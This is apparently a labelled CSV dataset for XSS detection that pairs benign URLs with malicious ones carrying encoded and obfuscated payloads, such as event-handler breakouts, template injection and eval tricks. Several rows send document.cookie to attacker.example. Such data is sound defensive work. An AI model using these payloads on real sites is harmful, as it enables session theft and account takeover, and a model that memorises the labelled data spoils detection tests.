url,payload,carrier,param_name,encoded,notes,label
https://blog.example/user/42/profile,42,path,,raw,benign,0
https://mysite.example/search?ref=en-new534&session=newsletter,en-new534,query,ref,raw,benign,0
https://testsite.local/search?id=welcome,welcome,query,id,raw,benign,0
https://webapp.local/search?url=article,article,query,url,raw,benign,0
https://demo.example.org/redirect?url=https://victim.example/?p=category,category,redirect,query,raw,benign,0
https://testsite.local/user/<script>alert(1)</script>/profile,<script>alert(1)</script>,path,,raw,script_tag,1
https://testsite.local/search?callback=item-ref,item-ref,query,callback,raw,benign,0
"https://tEStSite.locaL/search?file=""><svg onload=alert(1)>&lang=google","""><svg onload=alert(1)>",query,file,raw,attribute_breakout_svg,1
https://blog.example/search?name=signup,signup,query,name,raw,benign,0
https://blog.example/search?url=order,order,query,url,raw,benign,0
https://vulnerable.app/search?query=%27%29%3Balert%281%29%3B%2F%2F,');alert(1);//,query,query,urlencoded,inline_js_snippet,1
https://webapp.local/search?q={{constructor.constructor(&#x27;alert(1)&#x27;)()}},{{constructor.constructor('alert(1)')()}},query,q,html_entity,template_injection,1
"https://vulnerable.app/api?callback=""><video><source onerror=alert(1)></video>&id=1","""><video><source onerror=alert(1)></video>",callback,url,raw,attribute_breakout_video,1
https://portal.example.net/api?callback=1&id=1&lang=organic,1,callback,view,raw,benign,0
https://service.test/page#42,42,fragment,,raw,benign,0
https://catalog.example/api?callback=index&id=1,index,callback,input,raw,benign,0
https://mysite.example/search?q=user,user,query,q,raw,benign,0
https://webapp.local/search?query=%253Cscript%253Ealert%281%29%253C%2Fscript%253E,%3Cscript%3Ealert(1)%3C/script%3E,query,query,urlencoded,already_encoded,1
https://demo.example.org/search?page=page,page,query,page,raw,benign,0
https://webapp.local/search?term=test&session=1,test,query,term,raw,benign,0
https://webapp.local/search?term=42&session=0,42,query,term,raw,benign,0
https://catalog.example/page#index,index,fragment,,raw,benign,0
https://blog.example/user/index/profile,index,path,,raw,benign,0
https://mysite.example/search?name=profile&utm_source=newsletter,profile,query,name,raw,benign,0
https://shop.example/search?query=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<script>alert(1)</script>,query,query,urlencoded,script_tag,1
https://demo.example.org/search?name=welcome&lang=en,welcome,query,name,raw,benign,0
https://webapp.local/search?q=details,details,query,q,raw,benign,0
https://teSTSite.LoCal/user/%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D/profile,{{constructor.constructor('alert(1)')()}},path,,urlencoded,template_injection,1
https://blog.example/search?redirect=blog&lang=organic,blog,query,redirect,raw,benign,0
https://testsite.local/search?utm_source=about&ref=newsletter,about,query,utm_source,raw,benign,0
https://demo.example.org/page#42,42,fragment,,raw,benign,0
https://testsite.local/user/en/profile,en,path,,raw,benign,0
https://vulnerable.app/search?query=%3Cscript%3Efetch%28%27http%3A%2F%2Fattacker.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,query,urlencoded,cookie_exfil,1
https://example.com/search?name=login,login,query,name,raw,benign,0
https://demo.example.org/search?tmpl=%253Cscript%253Ealert%281%29%253C%2Fscript%253E&utm_source=en,%3Cscript%3Ealert(1)%3C/script%3E,query,tmpl,urlencoded,already_encoded,1
https://demo.example.org/search?s={{constructor.constructor('alert(1)')()}},{{constructor.constructor('alert(1)')()}},query,s,raw,template_injection,1
https://blog.example/search?callback=welcome&source=en,welcome,query,callback,raw,benign,0
https://blog.example/redirect?url=https://victim.example/?p=details&source=en,details,redirect,name,raw,benign,0
https://service.test/user/%22%3E%3Csvg%20onload%3Dalert%281%29%3E/profile,"""><svg onload=alert(1)>",path,,urlencoded,attribute_breakout_svg,1
https://example.com/search?input=home,home,query,input,raw,benign,0
https://blog.example/page#details,details,fragment,,raw,benign,0
https://catalog.example/search?utm_source=login,login,query,utm_source,raw,benign,0
https://demo.example.org/search?lang=news-usr97083,news-usr97083,query,lang,raw,benign,0
https://mysite.example/search?s=en,en,query,s,raw,benign,0
https://portal.example.net/search?callback=%253Csvg%253E%253Cdesc%253E%253C%2521%255BCDATA%255B%253C%252Fdesc%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%255D%255D%253E%253C%252Fsvg%253E,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,callback,double_urlencoded,svg_cdata_script,1
https://vulnerable.app/api?callback=%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E&id=1&session=newsletter,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,callback,redirect,urlencoded,svg_cdata_script,1
https://service.test/user/blog/profile,blog,path,,raw,benign,0
https://webapp.local/search?view=signup,signup,query,view,raw,benign,0
https://service.test/user/%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D/profile,{{constructor.constructor('alert(1)')()}},path,,urlencoded,template_injection,1
https://service.test/search?callback=&lt;math&gt;&lt;mi&gt;&lt;/mi&gt;&lt;mfrac&gt;&lt;mn&gt;&lt;/mn&gt;&lt;/mfrac&gt;&lt;/math&gt;&lt;script&gt;alert(1)&lt;/script&gt;&utm_source=0,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,callback,html_entity,script_in_math,1
https://example.com/redirect?url=https://victim.example/?p=user63515,user63515,redirect,name,raw,benign,0
https://testsite.local/user/prices/profile,prices,path,,raw,benign,0
https://demo.example.org/search?utm_source=test,test,query,utm_source,raw,benign,0
https://example.com/user/%27%29%3Balert%281%29%3B%2F%2F/profile,');alert(1);//,path,,urlencoded,inline_js_snippet,1
https://webapp.local/search?lang=signup&ref=1,signup,query,lang,raw,benign,0
https://webapp.local/page#%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",fragment,,urlencoded,eval_obf,1
https://testsite.local/search?id=&lt;body onload=alert(1)&gt;,<body onload=alert(1)>,query,id,html_entity,body_onload,1
https://demo.example.org/api?callback=%3Cmeta%20http-equiv%3D%27refresh%27%20content%3D%270%3Burl%3Djavascript%3Aalert%281%29%27%3E&id=1&utm_source=1,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,callback,callback,urlencoded,meta_refresh_js_uri,1
https://blog.example/user/index-info77384/profile,index-info77384,path,,raw,benign,0
"https://webapp.local/redirect?url=https://victim.example/?p=');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//","');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",redirect,id,raw,eval_obf,1
https://service.test/api?callback=category&id=1,category,callback,input,raw,benign,0
https://webapp.local/search?name=<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>&ref=en,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,name,raw,cookie_exfil,1
https://webapp.local/api?callback=category&id=1,category,callback,s,raw,benign,0
https://service.test/api?callback=prices&id=1,prices,callback,q,raw,benign,0
https://shop.example/search?s=&lt;svg&gt;&lt;desc&gt;&lt;![CDATA[&lt;/desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;&lt;/svg&gt;&utm_source=google,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,s,html_entity,svg_cdata_script,1
https://testsite.local/user/checkout-2025/profile,checkout-2025,path,,raw,benign,0
https://shop.example/search?query=%22%3E%3Csvg%20onload%3Dalert%281%29%3E,"""><svg onload=alert(1)>",query,query,urlencoded,attribute_breakout_svg,1
https://portal.example.net/user/category-ref/profile,category-ref,path,,raw,benign,0
https://shop.example/search?input=&quot;&gt;&lt;svg onload=alert(1)&gt;&page=google,"""><svg onload=alert(1)>",query,input,html_entity,attribute_breakout_svg,1
https://portal.example.net/search?q=2025-10-01&utm_source=en,2025-10-01,query,q,raw,benign,0
https://shop.example/api?callback=details35143&id=1&session=google,details35143,callback,ref,raw,benign,0
https://example.com/user/%2522%253E%253Csvg%2520onload%253Dalert%25281%2529%253E/profile,"""><svg onload=alert(1)>",path,,double_urlencoded,attribute_breakout_svg,1
https://blog.example/search?redirect=1&page=1,1,query,redirect,raw,benign,0
https://shop.example/search?file=order-2025&page=en,order-2025,query,file,raw,benign,0
https://demo.example.org/search?page=order-2025,order-2025,query,page,raw,benign,0
https://mysite.example/redirect?url=https://victim.example/?p=cart&source=en,cart,redirect,redirect,raw,benign,0
https://example.com/user/%22%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E/profile,"""><video><source onerror=alert(1)></video>",path,,mixed,attribute_breakout_video,1
https://testsite.local/search?page=login41427&utm_source=1,login41427,query,page,raw,benign,0
https://service.test/search?search=');alert(1);//,');alert(1);//,query,search,raw,inline_js_snippet,1
https://blog.example/search?q=page,page,query,q,raw,benign,0
https://catalog.example/search?file=42,42,query,file,raw,benign,0
https://service.test/search?lang=42&lang=organic,42,query,lang,raw,benign,0
https://mysite.example/search?redirect=index-info,index-info,query,redirect,raw,benign,0
https://example.com/api?callback=1&id=1&lang=0,1,callback,ref,raw,benign,0
https://testsite.local/search?ref=item,item,query,ref,raw,benign,0
https://portal.example.net/redirect?url=https://victim.example/?p=category,category,redirect,url,raw,benign,0
https://demo.example.org/search?q=&#x27;);document.location=&#x27;javascript:alert(1)&#x27;//,');document.location='javascript:alert(1)'//,query,q,html_entity,document_location_js,1
https://demo.example.org/search?view=product,product,query,view,raw,benign,0
https://testsite.local/search?input=%3Cscript%3Efetch%28%27http%3A%2F%2Fattacker.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,input,urlencoded,cookie_exfil,1
https://demo.example.org/user/2025-10-01/profile,2025-10-01,path,,raw,benign,0
https://portal.example.net/page#2025-10-01,2025-10-01,fragment,,raw,benign,0
"https://example.com/search?callback=""><svg onload=alert(1)>&session=en","""><svg onload=alert(1)>",query,callback,raw,attribute_breakout_svg,1
https://shop.example/user/welcome/profile,welcome,path,,raw,benign,0
https://mysite.example/search?term=page&session=1,page,query,term,raw,benign,0
https://mysite.example/search?search=news&lang=1,news,query,search,raw,benign,0
https://mysite.example/api?callback=contact&id=1,contact,callback,redirect,raw,benign,0
https://webapp.local/search?term=product&lang=1,product,query,term,raw,benign,0
https://webapp.local/search?redirect=home&utm_source=en,home,query,redirect,raw,benign,0
https://mysite.example/search?name=article,article,query,name,raw,benign,0
https://testsite.local/page#user,user,fragment,,raw,benign,0
https://catalog.example/search?id=cart&source=affiliate,cart,query,id,raw,benign,0
https://portal.example.net/user/profile/profile,profile,path,,raw,benign,0
https://shop.example/api?callback=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&id=1&lang=google,<script>alert(1)</script>,callback,callback,mixed,script_tag,1
https://demo.example.org/api?callback=%3Cmeta%20http-equiv%3D%27refresh%27%20content%3D%270%3Burl%3Djavascript%3Aalert%281%29%27%3E&id=1,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,callback,callback,urlencoded,meta_refresh_js_uri,1
https://shop.example/search?id=%2527%2529%253Beval%2528String.fromCharCode%252897%252C108%252C101%252C114%252C116%252C40%252C49%252C41%2529%2529%252F%252F,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,id,double_urlencoded,eval_obf,1
https://shop.example/search?search=category,category,query,search,raw,benign,0
https://mysite.example/search?search=1,1,query,search,raw,benign,0
https://demo.exaMple.Org/api?callback=&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0;url=javascript:alert(1)&#x27;&gt;&id=1&ref=en,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,callback,callback,html_entity,meta_refresh_js_uri,1
https://mysite.example/search?view=page-details&ref=newsletter,page-details,query,view,raw,benign,0
https://testsite.local/search?lang=about,about,query,lang,raw,benign,0
"https://demo.example.org/search?q=""><video><source onerror=alert(1)></video>","""><video><source onerror=alert(1)></video>",query,q,raw,attribute_breakout_video,1
https://webapp.local/search?input=2025-10-01&ref=en,2025-10-01,query,input,raw,benign,0
https://demo.example.org/search?page={{constructor.constructor(&#x27;alert(1)&#x27;)()}}&session=en,{{constructor.constructor('alert(1)')()}},query,page,html_entity,template_injection,1
https://service.test/api?callback=order&id=1,order,callback,ref,raw,benign,0
https://blog.example/search?id=home-2025,home-2025,query,id,raw,benign,0
https://portAl.example.net/page#&quot;&gt;&lt;img src=x onerror=alert(1)&gt;,"""><img src=x onerror=alert(1)>",fragment,,html_entity,attribute_breakout_img,1
https://service.test/page#%3Cscript%3Ealert%281%29%3C%2Fscript%3E,%3Cscript%3Ealert(1)%3C/script%3E,fragment,,mixed,already_encoded,1
"https://testsite.local/user/""><video><source onerror=alert(1)></video>/profile","""><video><source onerror=alert(1)></video>",path,,raw,attribute_breakout_video,1
https://blog.example/search?file=home-x,home-x,query,file,raw,benign,0
https://vulnerable.app/search?page=%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ref=1,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,page,urlencoded,script_in_math,1
https://testsite.local/search?q=<body onload=alert(1)>,<body onload=alert(1)>,query,q,raw,body_onload,1
https://portal.example.net/api?callback=%253Cscript%253Ealert%281%29%253C%2Fscript%253E&id=1,%3Cscript%3Ealert(1)%3C/script%3E,callback,callback,urlencoded,already_encoded,1
https://blog.example/search?ref=user,user,query,ref,raw,benign,0
"https://webapp.local/api?callback=""><svg onload=alert(1)>&id=1&lang=newsletter","""><svg onload=alert(1)>",callback,view,raw,attribute_breakout_svg,1
https://testsite.local/search?utm_source=signup-2025,signup-2025,query,utm_source,raw,benign,0
https://portal.example.net/api?callback=%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F&id=1&utm_source=xyz,');document.location='javascript:alert(1)'//,callback,search,urlencoded,document_location_js,1
https://service.test/search?lang=product&ref=google,product,query,lang,raw,benign,0
https://catalog.example/search?input=home&page=1,home,query,input,raw,benign,0
https://shop.example/search?url=details&utm_source=en,details,query,url,raw,benign,0
https://example.com/search?redirect=details&lang=organic,details,query,redirect,raw,benign,0
https://webapp.local/search?utm_source=checkout,checkout,query,utm_source,raw,benign,0
https://example.com/search?term=product,product,query,term,raw,benign,0
https://testsite.local/search?term=page-new&lang=1,page-new,query,term,raw,benign,0
https://webapp.local/api?callback=order&id=1,order,callback,term,raw,benign,0
https://demo.example.org/search?ref=about&utm_source=google,about,query,ref,raw,benign,0
https://example.com/search?id=%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,"""><img src=x onerror=alert(1)>",query,id,double_urlencoded,attribute_breakout_img,1
https://shop.example/search?input=%253Csvg%253E%253Cdesc%253E%253C%2521%255BCDATA%255B%253C%252Fdesc%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%255D%255D%253E%253C%252Fsvg%253E,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,input,double_urlencoded,svg_cdata_script,1
https://portal.example.net/search?id=42&session=1,42,query,id,raw,benign,0
https://service.test/api?callback=<iframe src='javascript:alert(1)'></iframe>&id=1&page=1,<iframe src='javascript:alert(1)'></iframe>,callback,tmpl,raw,iframe_js_uri,1
https://portal.example.net/user/about-details/profile,about-details,path,,raw,benign,0
https://portal.example.net/search?id=login&ref=organic,login,query,id,raw,benign,0
https://shop.example/user/');alert(1);///profile,');alert(1);//,path,,raw,inline_js_snippet,1
https://demo.example.org/search?view=%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F&ref=newsletter,');document.location='javascript:alert(1)'//,query,view,urlencoded,document_location_js,1
https://example.com/search?search=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>&page=xyz,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,search,raw,svg_cdata_script,1
https://service.test/search?callback=%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F&lang=0,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,callback,mixed,eval_obf,1
https://shop.example/search?lang=checkout-details&utm_source=newsletter,checkout-details,query,lang,raw,benign,0
https://example.com/api?callback=%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E&id=1&session=en,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,callback,tmpl,urlencoded,svg_cdata_script,1
"https://service.test/api?callback=""><img src=x onerror=alert(1)>&id=1","""><img src=x onerror=alert(1)>",callback,callback,raw,attribute_breakout_img,1
https://demo.example.org/api?callback=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>&id=1,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,callback,url,raw,meta_refresh_js_uri,1
https://shop.example/search?redirect=test,test,query,redirect,raw,benign,0
https://service.test/redirect?url=https://victim.example/?p=article&page=0,article,redirect,view,raw,benign,0
https://demo.example.org/redirect?url=https://victim.example/?p=&#x27;);alert(1);//&lang=0,');alert(1);//,redirect,term,html_entity,inline_js_snippet,1
https://service.test/search?term=article-new,article-new,query,term,raw,benign,0
https://service.test/search?term=<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,term,raw,script_in_math,1
https://testsite.local/search?query=about-ref,about-ref,query,query,raw,benign,0
https://service.test/search?query=index-usr&lang=1,index-usr,query,query,raw,benign,0
https://service.test/search?url=test&source=1,test,query,url,raw,benign,0
https://catalog.example/search?redirect=prices,prices,query,redirect,raw,benign,0
https://blog.example/search?id=category,category,query,id,raw,benign,0
https://service.test/search?callback=<body onload=alert(1)>,<body onload=alert(1)>,query,callback,raw,body_onload,1
https://webapp.local/api?callback=item&id=1,item,callback,file,raw,benign,0
https://testsite.local/search?ref=home,home,query,ref,raw,benign,0
https://webapp.local/search?msg=');alert(1);//,');alert(1);//,query,msg,raw,inline_js_snippet,1
https://webapp.local/search?term=contact&lang=en,contact,query,term,raw,benign,0
"https://shop.example/user/');eval(String.fromCharCode(97,108,101,114,116,40,49,41))///profile","');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",path,,raw,eval_obf,1
"https://service.test/search?callback=""><svg onload=alert(1)>","""><svg onload=alert(1)>",query,callback,raw,attribute_breakout_svg,1
https://testsite.local/search?term=%253Cscript%253Ealert%281%29%253C%2Fscript%253E&lang=1,%3Cscript%3Ealert(1)%3C/script%3E,query,term,urlencoded,already_encoded,1
https://catalog.example/redirect?url=https://victim.example/?p=test,test,redirect,ref,raw,benign,0
https://testsite.local/api?callback=%3Cmeta+http-equiv%3D%27refresh%27+content%3D%270%3Burl%3Djavascript%3Aalert%281%29%27%3E&id=1,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,callback,callback,mixed,meta_refresh_js_uri,1
https://catalog.example/search?ref=test&lang=newsletter,test,query,ref,raw,benign,0
"https://demo.example.org/search?search=<img src=1 onerror=alert(String.fromCharCode(88,83,83))>","<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,search,raw,img_onerror_obf,1
https://blog.example/search?s=about&utm_source=newsletter,about,query,s,raw,benign,0
https://blog.example/redirect?url=https://victim.example/?p=2025-10-01,2025-10-01,redirect,query,raw,benign,0
https://shop.example/search?url=javascript%3Aalert%281%29,javascript:alert(1),query,url,urlencoded,js_uri,1
https://vulnerable.app/search?tmpl=%253Cscript%253Ealert%281%29%253C%2Fscript%253E&lang=en,%3Cscript%3Ealert(1)%3C/script%3E,query,tmpl,urlencoded,already_encoded,1
https://example.com/search?search=%3Cimg+src%3D1+onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,search,mixed,img_onerror_obf,1
https://example.com/search?id=%3Cimg%20src%3D1%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E&page=1,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,id,urlencoded,img_onerror_obf,1
https://testsite.local/search?query=%3Cimg%20src%3D1%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E&page=1,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,query,urlencoded,img_onerror_obf,1
https://service.test/search?name=');alert(1);//,');alert(1);//,query,name,raw,inline_js_snippet,1
https://example.com/search?search=order,order,query,search,raw,benign,0
https://testsite.local/search?url=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D&utm_source=1,{{constructor.constructor('alert(1)')()}},query,url,urlencoded,template_injection,1
https://portal.example.net/search?utm_source=details&lang=1,details,query,utm_source,raw,benign,0
https://shop.example/api?callback=<body onload=alert(1)>&id=1&lang=0,<body onload=alert(1)>,callback,callback,raw,body_onload,1
https://mysite.example/page#category71827,category71827,fragment,,raw,benign,0
https://blog.example/search?redirect=en,en,query,redirect,raw,benign,0
https://portal.example.net/redirect?url=https://victim.example/?p=test&session=google,test,redirect,s,raw,benign,0
https://portal.example.net/search?s=article,article,query,s,raw,benign,0
https://mysite.example/search?redirect=news,news,query,redirect,raw,benign,0
https://webapp.local/api?callback=%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F&id=1,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",callback,term,mixed,eval_obf,1
https://mysite.example/search?session=checkout,checkout,query,session,raw,benign,0
https://blog.example/api?callback=article6837&id=1,article6837,callback,callback,raw,benign,0
https://portal.example.net/user/%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E/profile,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,path,,urlencoded,script_in_math,1
https://example.com/search?msg=product&session=google,product,query,msg,raw,benign,0
https://testsite.local/search?input=category15577&ref=newsletter,category15577,query,input,raw,benign,0
https://service.test/search?url=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,url,raw,meta_refresh_js_uri,1
https://blog.example/search?name=welcome&session=affiliate,welcome,query,name,raw,benign,0
https://example.com/api?callback=%22%3E%3Csvg+onload%3Dalert%281%29%3E&id=1&lang=xyz,"""><svg onload=alert(1)>",callback,callback,mixed,attribute_breakout_svg,1
https://testsite.local/redirect?url=https://victim.example/?p=%22%3E%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E&page=newsletter,"""><video><source onerror=alert(1)></video>",redirect,search,urlencoded,attribute_breakout_video,1
https://webapp.local/search?file=news-202562136,news-202562136,query,file,raw,benign,0
https://mysite.example/search?ref=en,en,query,ref,raw,benign,0
https://vulnerable.app/user/%3Cscript%3Efetch%28%27http%3A%2F%2Fattacker.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E/profile,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,path,,urlencoded,cookie_exfil,1
https://WEbApp.Local/api?callback=%2527%2529%253Bdocument.location%253D%2527javascript%253Aalert%25281%2529%2527%252F%252F&id=1,');document.location='javascript:alert(1)'//,callback,tmpl,double_urlencoded,document_location_js,1
https://shop.example/search?msg=%2527%2529%253Beval%2528String.fromCharCode%252897%252C108%252C101%252C114%252C116%252C40%252C49%252C41%2529%2529%252F%252F,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,msg,double_urlencoded,eval_obf,1
https://testsite.local/page#%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,"""><img src=x onerror=alert(1)>",fragment,,mixed,attribute_breakout_img,1
https://catalog.example/user/en/profile,en,path,,raw,benign,0
https://service.test/redirect?url=https://victim.example/?p=blog,blog,redirect,ref,raw,benign,0
https://catalog.example/search?query=login,login,query,query,raw,benign,0
https://service.test/search?view=user,user,query,view,raw,benign,0
https://shop.example/user/index/profile,index,path,,raw,benign,0
https://testsite.local/api?callback=order&id=1,order,callback,callback,raw,benign,0
https://mysite.example/search?session=news,news,query,session,raw,benign,0
https://shop.example/page#login-usr45700,login-usr45700,fragment,,raw,benign,0
https://service.test/search?term=%257B%257Bconstructor.constructor%2528%2527alert%25281%2529%2527%2529%2528%2529%257D%257D,{{constructor.constructor('alert(1)')()}},query,term,double_urlencoded,template_injection,1
https://demo.example.org/user/%2522%253E%253Csvg%2520onload%253Dalert%25281%2529%253E/profile,"""><svg onload=alert(1)>",path,,double_urlencoded,attribute_breakout_svg,1
https://shop.example/search?redirect=category72119,category72119,query,redirect,raw,benign,0
https://demo.example.org/search?input=login-2025,login-2025,query,input,raw,benign,0
https://shop.example/redirect?url=https://victim.example/?p=news&page=1,news,redirect,utm_source,raw,benign,0
https://portal.example.net/search?file=2025-10-01&utm_source=newsletter,2025-10-01,query,file,raw,benign,0
https://webapp.local/search?ref=index&page=google,index,query,ref,raw,benign,0
https://webapp.local/api?callback=cart&id=1,cart,callback,term,raw,benign,0
https://demo.example.org/search?s=%253Cscript%253Ealert%281%29%253C%2Fscript%253E,%3Cscript%3Ealert(1)%3C/script%3E,query,s,urlencoded,already_encoded,1
https://shop.example/redirect?url=https://victim.example/?p=contact&page=affiliate,contact,redirect,page,raw,benign,0
https://example.com/search?input=42&source=en,42,query,input,raw,benign,0
https://service.test/redirect?url=https://victim.example/?p=home,home,redirect,search,raw,benign,0
https://service.test/page#login,login,fragment,,raw,benign,0
https://shop.example/search?q=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,q,raw,meta_refresh_js_uri,1
https://webapp.local/redirect?url=https://victim.example/?p=%3Cscript%3Ealert(1)%3C/script%3E,%3Cscript%3Ealert(1)%3C/script%3E,redirect,view,html_entity,already_encoded,1
https://testsite.local/search?ref=news,news,query,ref,raw,benign,0
https://mysite.example/user/article-usr/profile,article-usr,path,,raw,benign,0
https://testsite.local/search?file=home,home,query,file,raw,benign,0
https://portal.example.net/user/');document.location='javascript:alert(1)'///profile,');document.location='javascript:alert(1)'//,path,,raw,document_location_js,1
https://service.test/user/<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>/profile,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,path,,raw,cookie_exfil,1
"https://example.com/search?page=""><video><source onerror=alert(1)></video>","""><video><source onerror=alert(1)></video>",query,page,raw,attribute_breakout_video,1
https://testsite.local/api?callback=<body onload=alert(1)>&id=1,<body onload=alert(1)>,callback,callback,raw,body_onload,1
https://webapp.local/search?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,"""><img src=x onerror=alert(1)>",query,q,urlencoded,attribute_breakout_img,1
https://demo.example.org/redirect?url=https://victim.example/?p=checkout&lang=google,checkout,redirect,term,raw,benign,0
https://testsite.local/page#cart,cart,fragment,,raw,benign,0
https://webapp.local/user/javascript%3Aalert%281%29/profile,javascript:alert(1),path,,mixed,js_uri,1
https://demo.example.org/redirect?url=https://victim.example/?p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<script>alert(1)</script>,redirect,tmpl,urlencoded,script_tag,1
https://portal.example.net/page#user,user,fragment,,raw,benign,0
